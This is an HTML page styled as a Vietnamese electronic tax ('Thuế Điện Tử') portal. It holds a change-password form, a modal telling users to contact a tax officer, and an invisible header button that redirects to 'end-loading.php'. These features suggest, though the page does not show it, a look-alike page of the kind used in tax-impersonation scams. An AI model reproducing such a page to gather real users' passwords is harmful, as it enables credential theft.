<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <link rel="stylesheet" href="../public/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    <title>Thuế Điện Tử</title>
    <link rel="icon" type="image/png" href="../image/thuedinetu.png" sizes="32x32">


</head>
<!--<div id="alert-container" style="position: fixed; top: 20px; right: 20px; z-index: 1050;"></div>-->

<div id="alert-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1049;"></div>
<div id="alert-popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1050;"></div>

<div id="customConfirm" class="custom-confirm" style="display: none;">
    <div class="confirm-box">
        <p class="confirm-message">Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.</p>
        <button class="confirm-ok-btn">OK</button>
    </div>
</div>

<!-- Popup thông báo mới -->
<div id="customPopupCuoi" class="custom-popup-cuoi">
    <div class="custom-popup-content-cuoi">
        <span class="custom-close-btn-cuoi" id="closePopupCuoi">&times;</span>
        <div class="bg-white-cuoi">
            <p id="popupMessageCuoi">Thông báo sẽ hiển thị ở đây.</p>
            <button type="button" class="confirm-ok-btn mt-1" id="okButtonCuoi">Tiếp tục</button>
        </div>
    </div>
</div>



<header>
    <button class="header-button" onclick="window.location.href='end-loading.php'">ㅤㅤ</button>
</header>





<script src="../public/js/style.js"></script>



<div class="container">
    <div class="bg-mau">
        <div class="app-main">
            <div class="header-home">
                <div class="menu item-center flex">
                    <a href="home.php"><i class="text-white fa-solid fa-angle-left"></i></a>
                </div>
                <div class="ml-2">
                    <img width="80" src="../image/thuedinetu.png" alt="">
                </div>
                <div class="qr flex item-center">
                    <a href="home.php"><i class="text-white fa-solid fa-house"></i></a>
                </div>
            </div>

            <div class="list-bank bg-white">
                <div class="info bg-white">
                    <div class="title-info">
                        <h4>Đổi mật khẩu</h4>
                    </div>
                </div>

                <div class="info bg-white">
                    <form id="change-password-form" method="POST">
    <div class="input-info mt-1">
        <p>Mật khẩu cũ</p>
        <input type="password" name="old-password" required>
    </div>
    <div class="input-info">
        <p>Mật khẩu mới</p>
        <input type="password" name="new-password" required>
    </div>
    <div class="input-info">
        <p>Xác nhận mật khẩu mới</p>
        <input type="password" name="confirm-password" required>
    </div>
    <button type="submit" class="btn-submit btn-main">Đổi mật khẩu</button>
</form>

                </div>
            </div>
        </div>
    </div>
</div>



